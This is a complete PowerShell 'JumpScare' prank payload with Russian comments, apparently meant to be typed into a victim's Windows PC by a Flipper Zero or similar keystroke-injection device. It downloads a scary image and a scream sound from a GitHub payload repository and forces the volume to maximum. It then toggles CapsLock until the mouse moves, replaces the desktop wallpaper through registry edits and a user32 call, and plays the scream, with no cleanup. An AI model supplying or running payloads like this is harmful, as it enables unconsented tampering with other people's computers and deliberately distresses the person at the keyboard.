# JumpScare Script - Flipper Zero Compatible (No Cleanup)

# Скачиваем страшное изображение
$image = "https://github.com/I-Am-Jakoby/hak5-submissions/raw/main/OMG/Payloads/OMG-JumpScare/jumpscare.png"
iwr $image -OutFile "$env:TEMP\i.png"

# Скачиваем звук крика
$wav = "https://github.com/I-Am-Jakoby/hak5-submissions/raw/main/OMG/Payloads/OMG-JumpScare/female_scream.wav"
iwr $wav -OutFile "$env:TEMP\s.wav"

# Устанавливаем громкость на максимум
$k = [Math]::Ceiling(100 / 2)
$o = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt $k; $i++) {
    $o.SendKeys([char]175)
}

# Функция ожидания движения мыши
function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell
    while ($true) {
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        } else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds 3
        }
    }
}

# Функция установки обоев рабочего стола
function Set-WallPaper {
    param (
        [string]$Image,
        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
        [string]$Style = "Center"
    )

    $WallpaperStyle = Switch ($Style) {
        "Fill"   { "10" }
        "Fit"    { "6" }
        "Stretch" { "2" }
        "Tile"   { "0" }
        "Center" { "0" }
        "Span"   { "22" }
    }

    If ($Style -eq "Tile") {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 1 -Force
    } else {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 0 -Force
    }

    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Params {
    [DllImport("User32.dll", CharSet=CharSet.Unicode)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

    [Params]::SystemParametersInfo(0x0014, 0, $Image, 0x01 -bor 0x02) | Out-Null
}

# Функция воспроизведения звука
function Play-WAV {
    $player = New-Object System.Media.SoundPlayer
    $player.SoundLocation = "$env:TEMP\s.wav"
    $player.playsync()
}

# Запуск
Pause-Script
Set-WallPaper -Image "$env:TEMP\i.png" -Style Center
Play-WAV

# Убедиться, что CapsLock выключен
Add-Type -AssemblyName System.Windows.Forms
if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock')) {
    (New-Object -ComObject WScript.Shell).SendKeys('{CapsLock}')
}